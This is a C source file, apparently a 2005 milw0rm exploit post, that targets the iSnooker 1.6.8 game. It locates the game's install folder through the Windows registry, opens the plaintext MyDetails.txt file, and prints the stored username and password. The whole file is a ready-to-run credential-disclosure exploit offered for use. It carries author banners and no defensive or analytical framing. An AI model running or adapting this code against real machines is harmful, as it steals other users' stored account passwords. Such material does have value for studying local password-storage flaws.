/*****************************************************************

iSnooker <= v1.6.8 Local Password Disclosure Exploit by Kozan

Application: iSnooker 1.6.8

Vendor:
Memir Software - memirsoftware.com and
The Snooker Club - thesnookerclub.com

Vulnerable Description:
iSnooker 1.6.8 discloses passwords to local users.

Discovered & Coded by Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*****************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>

HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int main()
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,

"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey) == ERROR_SUCCESS)
       {

           lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
              (LPBYTE) prgfiles, &dwBufLen);

                       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
                                RegCloseKey(hKey);
                                printf("An error occured. Can't get password!\n");
                                return -1;
                       }

                       RegCloseKey(hKey);

   }
       else
       {
               printf("An error occured. Can't get password!\n");
               return -1;
       }

       printf("\n\niSnooker 1.6.8 Local Password Disclosure Exploit by Kozan\n");
       printf("Credits to ATmaCA\n");
       printf("kozan@netmagister.com\n");
       printf("www.netmagister.com - www.spyinstructors.com\n\n");

       char pwdfile[BUFSIZE], username[BUFSIZE], password[BUFSIZE];

strcpy(pwdfile,strcat(prgfiles,"\\TheSnookerClub\\iSnooker\\MyDetails.txt"));

       int addr, i, y;
       FILE *fp;
       char ch[100], ch2[100];

       if((fp=fopen(pwdfile,"rb")) == NULL)
       {
               printf("An error occured. Can't get password!\n");
               return -1;
       }

       fseek(fp,0,0);

       for(i=0;i<30;i++)
       {
               ch[i]=getc(fp);
               if(ch[i]==0x0D)
               {
                       ch[i]=NULL;
                       strcpy(username,ch);
                       break;
               }
       }

       addr = ftell(fp);
       fseek(fp,addr+1,0);

       for(y=0;y<30;y++)
       {
               ch2[y]=getc(fp);
               if(ch2[y]==0x0D)
               {
                       ch2[y]=NULL;
                       strcpy(password,ch2);
                       break;
               }
       }

       fclose(fp);

       printf("Username        : %s\n",username);
       printf("Password        : %s\n",password);

       return 0;
}

// milw0rm.com [2005-03-16]
